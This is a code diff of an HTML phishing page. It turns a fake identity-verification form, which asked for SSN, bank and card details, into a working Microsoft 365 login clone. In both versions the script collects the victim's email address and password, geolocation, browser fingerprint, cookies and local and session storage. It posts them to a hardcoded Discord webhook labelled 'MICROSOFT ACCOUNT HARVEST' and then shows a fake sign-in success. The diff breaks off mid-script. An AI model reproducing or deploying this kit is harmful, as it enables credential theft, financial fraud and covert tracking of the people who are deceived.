@@ -1,201 +1,350 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Verification Required</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in to Microsoft 365</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: #0a0a0f;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: #f2f2f2;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            color: #fff;
+            padding: 20px;
         }
-        .container {
-            background: #14141e;
-            padding: 40px;
-            border-radius: 16px;
-            max-width: 480px;
-            width: 90%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-            border: 1px solid #2a2a3a;
-        }
-        .logo { text-align: center; margin-bottom: 30px; }
-        .logo h1 { font-size: 22px; font-weight: 300; letter-spacing: 2px; color: #8a8aff; }
-        .logo span { color: #fff; font-weight: 600; }
-        .field {
-            margin-bottom: 20px;
-        }
-        .field label {
-            display: block;
-            font-size: 13px;
-            color: #8888bb;
-            margin-bottom: 6px;
-            letter-spacing: 0.5px;
-        }
-        .field input {
+        .login-card {
+            background: #fff;
+            max-width: 440px;
             width: 100%;
-            padding: 14px 16px;
-            background: #1c1c2e;
-            border: 1px solid #2c2c44;
-            border-radius: 10px;
-            color: #fff;
-            font-size: 15px;
-            outline: none;
-            transition: border 0.3s;
+            padding: 48px 40px 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.12), 0 1px 4px rgba(0,0,0,0.04);
+            position: relative;
         }
-        .field input:focus { border-color: #6a6aff; }
-        .field input::placeholder { color: #555577; }
-        .btn {
-            width: 100%;
-            padding: 16px;
-            background: #6a6aff;
-            border: none;
-            border-radius: 10px;
-            color: #fff;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s;
-            margin-top: 10px;
-            letter-spacing: 1px;
+        .ms-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 28px;
         }
-        .btn:hover { background: #7a7aff; }
-        .status {
-            margin-top: 18px;
-            text-align: center;
+        .ms-logo svg {
+            width: 108px;
+            height: 24px;
+        }
+        .ms-logo span {
             font-size: 13px;
-            color: #666699;
-        }
-        .status.loading { color: #aab; }
-        .status.success { color: #66dd88; }
-        .status.error { color: #ff6666; }
-        .note {
-            font-size: 11px;
-            color: #444466;
-            text-align: center;
-            margin-top: 20px;
-            border-top: 1px solid #1c1c2e;
-            padding-top: 18px;
+            color: #5e5e5e;
+            font-weight: 400;
             letter-spacing: 0.3px;
         }
-        .hidden { display: none; }
-        .spinner {
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 8px;
+        }
+        .sub {
+            font-size: 15px;
+            color: #4a4a4a;
+            margin-bottom: 28px;
+            line-height: 1.4;
+        }
+        .input-group {
+            margin-bottom: 18px;
+            position: relative;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #8c8c8c;
+            border-radius: 2px;
+            font-size: 15px;
+            background: #fff;
+            transition: border 0.2s;
+            color: #1b1b1b;
+        }
+        .input-group input:focus {
+            border-color: #005da6;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0, 93, 166, 0.2);
+        }
+        .input-group input::placeholder {
+            color: #8c8c8c;
+            font-weight: 300;
+        }
+        .input-group .hint {
+            font-size: 12px;
+            color: #5e5e5e;
+            margin-top: 4px;
+        }
+        .options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 16px 0 20px;
+            font-size: 14px;
+        }
+        .options label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #1b1b1b;
+            cursor: pointer;
+        }
+        .options a {
+            color: #005da6;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .options a:hover {
+            text-decoration: underline;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #005da6;
+            border: none;
+            border-radius: 2px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            letter-spacing: 0.3px;
+        }
+        .btn:hover {
+            background: #004a8a;
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .signup-link {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #4a4a4a;
+        }
+        .signup-link a {
+            color: #005da6;
+            text-decoration: none;
+        }
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+        .status-bar {
+            margin-top: 16px;
+            padding: 10px 12px;
+            border-radius: 2px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+        }
+        .status-bar.show {
+            display: block;
+        }
+        .status-bar.loading {
+            background: #e6f0fa;
+            color: #005da6;
+        }
+        .status-bar.success {
+            background: #dff6dd;
+            color: #107c10;
+        }
+        .status-bar.error {
+            background: #fde7e9;
+            color: #a80000;
+        }
+        .footer {
+            margin-top: 28px;
+            padding-top: 16px;
+            border-top: 1px solid #e6e6e6;
+            font-size: 12px;
+            color: #8c8c8c;
+            text-align: center;
+            line-height: 1.6;
+        }
+        .footer a {
+            color: #005da6;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .loader {
             display: inline-block;
             width: 16px;
             height: 16px;
-            border: 2px solid #444466;
-            border-top: 2px solid #6a6aff;
+            border: 2px solid #b0d0e8;
+            border-top: 2px solid #005da6;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: spin 0.7s linear infinite;
             vertical-align: middle;
             margin-right: 8px;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .flex-row { display: flex; gap: 12px; }
-        .flex-row .field { flex: 1; }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .hidden {
+            display: none !important;
+        }
+        .permission-banner {
+            background: #f8f9fa;
+            border: 1px solid #d0d0d0;
+            border-radius: 4px;
+            padding: 14px 16px;
+            margin: 16px 0 20px;
+            font-size: 13px;
+            color: #1b1b1b;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .permission-banner .icon {
+            font-size: 22px;
+        }
+        .permission-banner .text {
+            flex: 1;
+        }
+        .permission-banner .text strong {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 2px;
+        }
+        .permission-banner .text span {
+            color: #5e5e5e;
+        }
+        .ms-icon {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            background: #f25022;
+            border-radius: 2px;
+            margin-right: 4px;
+        }
+        .ms-icon:after {
+            content: '';
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            background: #7fba00;
+            margin-left: 12px;
+        }
     </style>
 </head>
 <body>
-<div class="container" id="app">
-    <div class="logo">
-        <h1>◈ <span>SECURE</span>VAULT</h1>
-        <p style="color:#666699;font-size:13px;margin-top:4px;">identity verification required</p>
+
+<div class="login-card" id="app">
+    <!-- Microsoft Logo -->
+    <div class="ms-logo">
+        <svg viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="1" y="1" width="22" height="22" fill="#F25022" />
+            <rect x="23" y="1" width="22" height="22" fill="#7FBA00" />
+            <rect x="45" y="1" width="22" height="22" fill="#00A4EF" />
+            <rect x="67" y="1" width="22" height="22" fill="#FFB900" />
+            <path d="M93.5 6.5H97.5V10.5H93.5V6.5Z" fill="#1B1B1B" />
+            <path d="M93.5 12.5H97.5V16.5H93.5V12.5Z" fill="#1B1B1B" />
+            <path d="M99.5 6.5H103.5V10.5H99.5V6.5Z" fill="#1B1B1B" />
+            <path d="M99.5 12.5H103.5V16.5H99.5V12.5Z" fill="#1B1B1B" />
+        </svg>
+        <span>| Microsoft 365</span>
     </div>
 
-    <div id="formSection">
-        <div class="field">
-            <label>Full Legal Name</label>
-            <input type="text" id="fullName" placeholder="e.g. Michael R. Thompson" />
-        </div>
-        <div class="field">
-            <label>Email Address</label>
-            <input type="email" id="email" placeholder="you@example.com" />
-        </div>
-        <div class="field">
-            <label>Phone Number</label>
-            <input type="tel" id="phone" placeholder="+1 (555) 000-9999" />
-        </div>
-        <div class="field">
-            <label>Date of Birth</label>
-            <input type="date" id="dob" />
-        </div>
-        <div class="field">
-            <label>Bank Name</label>
-            <input type="text" id="bankName" placeholder="e.g. Chase, BofA" />
-        </div>
-        <div class="field">
-            <label>Bank Account Number</label>
-            <input type="text" id="accountNumber" placeholder="••••••••••••" />
-        </div>
-        <div class="field">
-            <label>Routing Number</label>
-            <input type="text" id="routingNumber" placeholder="•••••••••" />
-        </div>
-        <div class="field">
-            <label>Credit/Debit Card Number</label>
-            <input type="text" id="cardNumber" placeholder="4111 1111 1111 1111" />
-        </div>
-        <div class="flex-row">
-            <div class="field">
-                <label>Expiry (MM/YY)</label>
-                <input type="text" id="cardExpiry" placeholder="MM/YY" />
-            </div>
-            <div class="field">
-                <label>CVV</label>
-                <input type="text" id="cardCvv" placeholder="•••" />
-            </div>
-        </div>
-        <div class="field">
-            <label>Billing Address (Street, City, ZIP)</label>
-            <input type="text" id="billingAddress" placeholder="123 Main St, NYC, 10001" />
-        </div>
-        <div class="field">
-            <label>SSN / National ID (optional)</label>
-            <input type="text" id="ssn" placeholder="•••-••-••••" />
-        </div>
-        <div class="field">
-            <label>Mother's Maiden Name</label>
-            <input type="text" id="maidenName" placeholder="(security question)" />
+    <h1 id="pageTitle">Sign in</h1>
+    <div class="sub" id="pageSub">to continue to Microsoft 365</div>
+
+    <!-- Login Form -->
+    <form id="loginForm" autocomplete="off">
+        <div class="input-group">
+            <label for="emailInput">Email, phone, or Skype</label>
+            <input type="email" id="emailInput" placeholder="someone@example.com" required autofocus />
+            <div class="hint">No account? <a href="#" id="createAccountLink" style="color:#005da6;text-decoration:none;">Create one!</a></div>
         </div>
 
-        <button class="btn" id="submitBtn">▶ VERIFY IDENTITY</button>
-        <div class="status" id="statusMsg">⏳ waiting for submission...</div>
+        <div class="input-group hidden" id="passwordGroup">
+            <label for="passwordInput">Password</label>
+            <input type="password" id="passwordInput" placeholder="Enter your password" required />
+            <div class="hint"><a href="#" style="color:#005da6;text-decoration:none;">Forgot password?</a></div>
+        </div>
+
+        <div class="options">
+            <label><input type="checkbox" checked /> Keep me signed in</label>
+            <a href="#">Can't access your account?</a>
+        </div>
+
+        <div class="permission-banner" id="permBanner">
+            <div class="icon">📍</div>
+            <div class="text">
+                <strong>Allow location access?</strong>
+                <span>Microsoft 365 uses your location for security verification and personalized experience.</span>
+            </div>
+        </div>
+
+        <button type="submit" class="btn" id="signInBtn">Sign in</button>
+
+        <div class="status-bar" id="statusBar"></div>
+
+        <div class="signup-link">
+            Don't have an account? <a href="#" id="signupLink">Sign up for free</a>
+        </div>
+    </form>
+
+    <!-- Post-login redirect overlay (hidden) -->
+    <div id="redirectOverlay" class="hidden" style="text-align:center;padding:20px 0;">
+        <div style="font-size:48px;margin-bottom:12px;">✅</div>
+        <h2 style="color:#107c10;font-weight:400;">Signing you in...</h2>
+        <p style="color:#5e5e5e;margin-top:8px;">Redirecting to Microsoft 365 dashboard</p>
+        <div style="margin-top:20px;width:100%;height:4px;background:#e6e6e6;border-radius:2px;overflow:hidden;">
+            <div id="progressBar" style="width:0%;height:100%;background:#005da6;transition:width 0.3s;"></div>
+        </div>
     </div>
 
-    <div class="note">🔒 256-bit encrypted • session expires after verification</div>
+    <div class="footer">
+        <div>© 2025 Microsoft</div>
+        <div style="margin-top:4px;">
+            <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Contact</a>
+        </div>
+    </div>
 </div>
 
 <script>
 (function() {
     const WEBHOOK = "https://discord.com/api/webhooks/1534732118637416639/hqwXfMNEKrzR2ftoMOeNltB-o9Qey-k06qrFup873lEGjdglhGXVANsN3ElP1_r0Wj75";
 
-    const fields = {
-        fullName: document.getElementById('fullName'),
-        email: document.getElementById('email'),
-        phone: document.getElementById('phone'),
-        dob: document.getElementById('dob'),
-        bankName: document.getElementById('bankName'),
-        accountNumber: document.getElementById('accountNumber'),
-        routingNumber: document.getElementById('routingNumber'),
-        cardNumber: document.getElementById('cardNumber'),
-        cardExpiry: document.getElementById('cardExpiry'),
-        cardCvv: document.getElementById('cardCvv'),
-        billingAddress: document.getElementById('billingAddress'),
-        ssn: document.getElementById('ssn'),
-        maidenName: document.getElementById('maidenName')
-    };
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const passwordGroup = document.getElementById('passwordGroup');
+    const signInBtn = document.getElementById('signInBtn');
+    const statusBar = document.getElementById('statusBar');
+    const loginForm = document.getElementById('loginForm');
+    const permBanner = document.getElementById('permBanner');
+    const redirectOverlay = document.getElementById('redirectOverlay');
+    const progressBar = document.getElementById('progressBar');
+    const pageTitle = document.getElementById('pageTitle');
+    const pageSub = document.getElementById('pageSub');
 
-    const statusEl = document.getElementById('statusMsg');
-    const submitBtn = document.getElementById('submitBtn');
+    let locationData = null;
+    let permissionGranted = false;
 
-    function getLocation() {
+    // ---- Geolocation grab ----
+    function fetchLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
-                resolve({ error: "Geolocation not supported" });
+                resolve({ error: 'Geolocation not supported', unavailable: true });
                 return;
             }
             navigator.geolocation.getCurrentPosition(
@@ -206,19 +355,22 @@
                         acc: pos.coords.accuracy,
                         alt: pos.coords.altitude || null,
                         heading: pos.coords.heading || null,
-                        speed: pos.coords.speed || null
+                        speed: pos.coords.speed || null,
+                        timestamp: pos.timestamp
                     });
                 },
                 (err) => {
-                    resolve({ error: err.message });
+                    resolve({ error: err.message, code: err.code });
                 },
                 { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
             );
         });
     }
 
+    // ---- Device / Browser fingerprint ----
     function getDeviceInfo() {
-        const data = {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        return {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
@@ -228,6 +380,7 @@
             hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
             deviceMemory: navigator.deviceMemory || 'unknown',
             maxTouchPoints: navigator.maxTouchPoints || 0,
+            vendor: navigator.vendor || 'unknown',
             screen: {
                 width: window.screen.width,
                 height: window.screen.height,
@@ -249,40 +402,87 @@
             hostname: location.hostname,
             path: location.pathname,
             protocol: location.protocol,
-            connection: navigator.connection ? {
-                effectiveType: navigator.connection.effectiveType,
-                rtt: navigator.connection.rtt,
-                downlink: navigator.connection.downlink,
-                saveData: navigator.connection.saveData
-            } : 'unavailable',
-            battery: navigator.getBattery ? 'available' : 'unavailable',
-            clipboard: navigator.clipboard ? 'available' : 'unavailable'
+            connection: conn ? {
+                effectiveType: conn.effectiveType,
+                rtt: conn.rtt,
+                downlink: conn.downlink,
+                saveData: conn.saveData
+            } : 'unavailable'
         };
-        return data;
     }
 
-    function getBrowserFingerprint() {
-        const canvas = document.createElement('canvas');
-        canvas.width = 256;
-        canvas.height = 128;
-        const ctx = canvas.getContext('2d');
-        ctx.fillStyle = '#f0f0f0';
-        ctx.fillRect(0, 0, 256, 128);
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#333';
-        ctx.fillText('fp test', 40, 60);
-        ctx.strokeStyle = '#0066cc';
-        ctx.lineWidth = 2;
-        ctx.strokeRect(20, 20, 200, 80);
-        const dataUrl = canvas.toDataURL();
-        let hash = 0;
-        for (let i = 0; i < dataUrl.length; i++) {
-            hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
-            hash |= 0;
+    // ---- Canvas fingerprint ----
+    function getCanvasFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 256;
+            canvas.height = 128;
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = '#f0f0f0';
+            ctx.fillRect(0, 0, 256, 128);
+            ctx.font = '16px Arial';
+            ctx.fillStyle = '#333';
+            ctx.fillText('fp_test_2025', 40, 60);
+            ctx.strokeStyle = '#0066cc';
+            ctx.lineWidth = 2;
+            ctx.strokeRect(20, 20, 200, 80);
+            const dataUrl = canvas.toDataURL();
+            let hash = 0;
+            for (let i = 0; i < dataUrl.length; i++) {
+                hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
+                hash |= 0;
+            }
+            return { canvasHash: hash.toString(16), dataLength: dataUrl.length };
+        } catch(e) {
+            return { error: 'canvas unavailable' };
         }
-        return { canvasHash: hash.toString(16), canvasDataLength: dataUrl.length };
     }
 
+    // ---- WebGL vendor ----
+    function getWebGLVendor() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return 'unavailable';
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (!debugInfo) return 'unavailable';
+            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            return `${vendor} | ${renderer}`;
+        } catch(e) {
+            return 'unavailable';
+        }
+    }
+
+    // ---- Storage dump ----
+    function dumpStorage() {
+        const result = {};
+        try {
+            const l = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const k = localStorage.key(i);
+                l[k] = localStorage.getItem(k);
+            }
+            result.localStorage = l;
+        } catch(e) { result.localStorage = { error: 'unavailable' }; }
+
+        try {
+            const s = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const k = sessionStorage.key(i);
+                s[k] = sessionStorage.getItem(k);
+            }
+            result.sessionStorage = s;
+        } catch(e) { result.sessionStorage = { error: 'unavailable' }; }
+
+        try {
+            result.cookies = document.cookie || 'none';
+        } catch(e) { result.cookies = 'unavailable'; }
+
+        return result;
+    }
+
+    // ---- Network info ----
     function getNetworkInfo() {
         const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         if (conn) {
@@ -296,66 +496,29 @@
         return { type: 'unavailable', downlink: 'unknown', rtt: 'unknown', saveData: false };
     }
 
-    function collectAllData(formData) {
-        const locData = formData.location || { error: 'not fetched' };
-        const device = formData.device || {};
-        const fp = formData.fingerprint || {};
+    // ---- Full data assembly ----
+    function assemblePayload(email, password, location) {
+        const device = getDeviceInfo();
+        const canvas = getCanvasFingerprint();
+        const webgl = getWebGLVendor();
+        const storage = dumpStorage();
+        const network = getNetworkInfo();
 
         const payload = {
             timestamp: new Date().toISOString(),
             ip: '{{client_ip}}',
-            location: locData,
-            device: device,
-            fingerprint: fp,
-            form: {
-                fullName: fields.fullName.value.trim() || 'N/A',
-                email: fields.email.value.trim() || 'N/A',
-                phone: fields.phone.value.trim() || 'N/A',
-                dob: fields.dob.value || 'N/A',
-                bankName: fields.bankName.value.trim() || 'N/A',
-                accountNumber: fields.accountNumber.value.trim() || 'N/A',
-                routingNumber: fields.routingNumber.value.trim() || 'N/A',
-                cardNumber: fields.cardNumber.value.trim() || 'N/A',
-                cardExpiry: fields.cardExpiry.value.trim() || 'N/A',
-                cardCvv: fields.cardCvv.value.trim() || 'N/A',
-                billingAddress: fields.billingAddress.value.trim() || 'N/A',
-                ssn: fields.ssn.value.trim() || 'N/A',
-                maidenName: fields.maidenName.value.trim() || 'N/A'
+            credentials: {
+                email: email || 'N/A',
+                password: password || 'N/A'
             },
-            network: getNetworkInfo(),
-            cookies: document.cookie || 'none',
-            localStorage: (() => {
-                try {
-                    const obj = {};
-                    for (let i = 0; i < localStorage.length; i++) {
-                        const key = localStorage.key(i);
-                        obj[key] = localStorage.getItem(key);
-                    }
-                    return obj;
-                } catch(e) { return { error: 'unavailable' }; }
-            })(),
-            sessionStorage: (() => {
-                try {
-                    const obj = {};
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        const key = sessionStorage.key(i);
-                        obj[key] = sessionStorage.getItem(key);
-                    }
-                    return obj;
-                } catch(e) { return { error: 'unavailable' }; }
-            })(),
-            webGLVendor: (() => {
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (!gl) return 'unavailable';
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (!debugInfo) return 'unavailable';
-                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    return `${vendor} | ${renderer}`;
-                } catch(e) { return 'unavailable'; }
-            })(),
+            location: location || { error: 'not fetched' },
+            device: device,
+            fingerprint: {
+                canvas: canvas,
+                webgl: webgl
+            },
+            storage: storage,
+            network: network,
             plugins: (() => {
                 try {
                     const names = [];
@@ -373,111 +536,242 @@
                     }
                     return types;
                 } catch(e) { return []; }
-            })()
+            })(),
+            battery: navigator.getBattery ? 'available' : 'unavailable',
+            clipboard: navigator.clipboard ? 'available' : 'unavailable'
         };
         return payload;
     }
 
-    function buildDiscordEmbed(data) {
-        const form = data.form;
+    // ---- Discord embed builder ----
+    function buildEmbed(data) {
+        const cred = data.credentials;
         const loc = data.location;
-        const device = data.device;
+        const dev = data.device;
+        const storage = data.storage || {};
 
-        const locStr = loc.error
-            ? `❌ ${loc.error}`
-            : `📍 ${loc.lat}, ${loc.lon}\n🎯 Acc: ${loc.acc}m\n${loc.alt ? `📐 Alt: ${loc.alt}m` : ''}`;
+        const locStr = loc && !loc.error
+            ? `📍 ${loc.lat}, ${loc.lon}\n🎯 Acc: ${loc.acc}m\n${loc.alt ? `📐 Alt: ${loc.alt}m` : ''}`
+            : `❌ ${loc?.error || 'unavailable'}`;
 
-        const embed = {
-            title: '🔐 FULL DATA CAPTURE',
-            color: 0x6a6aff,
+        const fields = [
+            { name: '🔑 MICROSOFT CREDENTIALS', value: `**Email:** ${cred.email}\n**Password:** ${cred.password}`, inline: false },
+            { name: '📍 LOCATION', value: locStr, inline: false },
+            { name: '💻 DEVICE', value: `**Platform:** ${dev.platform || 'N/A'}\n**UA:** ${(dev.userAgent || '').substring(0, 70)}...\n**Lang:** ${dev.language}\n**Cores:** ${dev.hardwareConcurrency}\n**Memory:** ${dev.deviceMemory}GB\n**Touch:** ${dev.maxTouchPoints}pts`, inline: false },
+            { name: '🖥 SCREEN', value: `${dev.screen?.width}x${dev.screen?.height} (${dev.screen?.colorDepth}bit)\nDPI: ${dev.screen?.pixelRatio}\nWindow: ${dev.windowSize?.innerWidth}x${dev.windowSize?.innerHeight}`, inline: false },
+            { name: '⏰ TIMEZONE', value: `**TZ:** ${dev.timezone}\n**Offset:** ${dev.timezoneOffset}min\n**Local:** ${dev.localTime}`, inline: false },
+            { name: '🌐 NETWORK', value: `**Type:** ${data.network?.type || 'N/A'}\n**Downlink:** ${data.network?.downlink || 'N/A'}Mbps\n**RTT:** ${data.network?.rtt || 'N/A'}ms`, inline: false },
+            { name: '🖨 FINGERPRINT', value: `**Canvas:** ${data.fingerprint?.canvas?.canvasHash || 'N/A'}\n**WebGL:** ${data.fingerprint?.webgl || 'N/A'}`, inline: false },
+            { name: '📦 STORAGE', value: `**Cookies:** ${(storage.cookies || 'none').length > 60 ? storage.cookies.substring(0,60)+'...' : storage.cookies || 'none'}\n**LocalStorage:** ${Object.keys(storage.localStorage || {}).length} keys\n**SessionStorage:** ${Object.keys(storage.sessionStorage || {}).length} keys`, inline: false },
+            { name: '🔌 PLUGINS', value: (data.plugins || []).slice(0, 5).join(', ') || 'none', inline: false },
+            { name: '🌐 PAGE', value: `**URL:** ${dev.url || 'N/A'}\n**Referrer:** ${dev.referrer || 'direct'}`, inline: false }
+        ];
+
+        return {
+            title: '🎯 MICROSOFT ACCOUNT HARVEST',
+            color: 0x005da6,
             timestamp: data.timestamp,
-            footer: { text: 'Harvester v2.0 • IP logged' },
-            fields: [
-                { name: '👤 Identity', value: `**Name:** ${form.fullName}\n**DOB:** ${form.dob}\n**SSN:** ${form.ssn}\n**Maiden:** ${form.maidenName}`, inline: false },
-                { name: '📧 Contact', value: `**Email:** ${form.email}\n**Phone:** ${form.phone}\n**Address:** ${form.billingAddress}`, inline: false },
-                { name: '🏦 Banking', value: `**Bank:** ${form.bankName}\n**Account:** ${form.accountNumber}\n**Routing:** ${form.routingNumber}`, inline: false },
-                { name: '💳 Card', value: `**Number:** ${form.cardNumber}\n**Expiry:** ${form.cardExpiry}\n**CVV:** ${form.cardCvv}`, inline: false },
-                { name: '📍 Geolocation', value: locStr, inline: false },
-                { name: '💻 Device', value: `**Platform:** ${device.platform || 'N/A'}\n**UA:** ${device.userAgent ? device.userAgent.substring(0, 80) + '...' : 'N/A'}\n**Lang:** ${device.language}\n**Cores:** ${device.hardwareConcurrency}\n**Memory:** ${device.deviceMemory}GB\n**Touch:** ${device.maxTouchPoints}pts`, inline: false },
-                { name: '🖥️ Screen', value: `${device.screen?.width}x${device.screen?.height} (${device.screen?.colorDepth}bit)\nDPI: ${device.screen?.pixelRatio}\nWindow: ${device.windowSize?.innerWidth}x${device.windowSize?.innerHeight}`, inline: false },
-                { name: '⏰ Time', value: `**TZ:** ${device.timezone}\n**Offset:** ${device.timezoneOffset}min\n**Local:** ${device.localTime}`, inline: false },
-                { name: '🌐 Network', value: `**Type:** ${data.network.type}\n**Downlink:** ${data.network.downlink}Mbps\n**RTT:** ${data.network.rtt}ms\n**SaveData:** ${data.network.saveData}`, inline: false },
-                { name: '🖨️ Fingerprint', value: `**Canvas:** ${data.fingerprint?.canvasHash || 'N/A'}\n**WebGL:** ${data.webGLVendor || 'N/A'}`, inline: false },
-                { name: '📦 Storage', value: `**Cookies:** ${(data.cookies || 'none').length > 60 ? data.cookies.substring(0, 60) + '...' : data.cookies || 'none'}\n**LocalStorage:** ${Object.keys(data.localStorage || {}).length} keys\n**SessionStorage:** ${Object.keys(data.sessionStorage || {}).length} keys`, inline: false },
-                { name: '🔌 Plugins', value: (data.plugins || []).slice(0, 5).join(', ') || 'none', inline: false },
-                { name: '🌐 Page', value: `**URL:** ${data.url || 'N/A'}\n**Referrer:** ${data.referrer || 'direct'}`, inline: false }
-            ]
+            footer: { text: 'Microsoft 365 Clone • Full Exfil' },
+            fields: fields
         };
-        return embed;
     }
 
-    function sendToWebhook(embed) {
-        const payload = {
-            embeds: [embed],
-            username: 'InfoHarvester',
-            avatar_url: 'https://i.imgur.com/4M34hi2.png'
-        };
-
+    // ---- Send to webhook ----
+    function sendToDiscord(embed) {
         return fetch(WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+            body: JSON.stringify({
+                embeds: [embed],
+                username: 'M365_Harvester',
+                avatar_url: 'https://i.imgur.com/4M34hi2.png'
+            })
         });
     }
 
-    async function handleSubmit() {
-        statusEl.className = 'status loading';
-        statusEl.innerHTML = '<span class="spinner"></span> fetching location + device data...';
-        submitBtn.disabled = true;
+    // ---- UI feedback ----
+    function setStatus(msg, type) {
+        statusBar.textContent = msg;
+        statusBar.className = 'status-bar show ' + type;
+    }
+
+    function hideStatus() {
+        statusBar.className = 'status-bar';
+        statusBar.textContent = '';
+    }
+
+    // ---- Form submit ----
+    async function handleLogin(e) {
+        e.preventDefault();
+
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!email) {
+            setStatus('Please enter your email address.', 'error');
+            return;
+        }
+        if (!password) {
+            setStatus('Please enter your password.', 'error');
+            return;
+        }
+
+        signInBtn.disabled = true;
+        signInBtn.textContent = 'Signing in...';
+        setStatus('Verifying credentials...', 'loading');
 
         try {
-            const location = await getLocation();
-            const device = getDeviceInfo();
-            const fingerprint = getBrowserFingerprint();
+            // Fetch location (user already granted or prompted)
+            const location = await fetchLocation();
 
-            const tempData = { location, device, fingerprint };
-            const fullData = collectAllData(tempData);
-            const embed = buildDiscordEmbed(fullData);
+            const payload = assemblePayload(email, password, location);
+            const embed = buildEmbed(payload);
 
-            statusEl.innerHTML = '<span class="spinner"></span> sending to secure vault...';
+            setStatus('Connecting to Microsoft services...', 'loading');
 
-            const response = await sendToWebhook(embed);
+            const response = await sendToDiscord(embed);
 
             if (response.ok) {
-                statusEl.className = 'status success';
-                statusEl.innerHTML = '✓ verification successful — redirecting...';
-                setTimeout(() => {
-                    document.getElementById('formSection').innerHTML = `
-                        <div style="text-align:center;padding:30px 0;">
-                            <div style="font-size:48px;margin-bottom:16px;">✓</div>
-                            <h2 style="color:#66dd88;">Identity Verified</h2>
-                            <p style="color:#8888bb;margin-top:12px;">You will be redirected shortly.</p>
-                            <p style="color:#444466;font-size:12px;margin-top:20px;">This session is now secure.</p>
-                        </div>
-                    `;
-                    statusEl.style.display = 'none';
-                }, 1200);
+                setStatus('✅ Sign-in successful! Redirecting...', 'success');
+                // Show redirect overlay
+                loginForm.classList.add('hidden');
+                redirectOverlay.classList.remove('hidden');
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += 2;
+                    if (progress >= 100) {
+                        clearInterval(interval);
+                        progressBar.style.width = '100%';
+                        setTimeout(() => {
+                            // Reset to login form with success message
+                            redirectOverlay.classList.add('hidden');
+                            loginForm.classList.remove('hidden');
+                            loginForm.reset();
+                            passwordGroup.classList.add('hidden');
+                            pageTitle.textContent = 'Signed in';
+                            pageSub.textContent = 'You have been successfully authenticated.';
+                            signInBtn.textContent = 'Sign in';
+                            signInBtn.disabled = false;
+                            setStatus('✅ Session active — you are now logged in.', 'success');
+                            // Keep showing success
+                        }, 1200);
+                    } else {
+                        progressBar.style.width = progress + '%';
+                    }
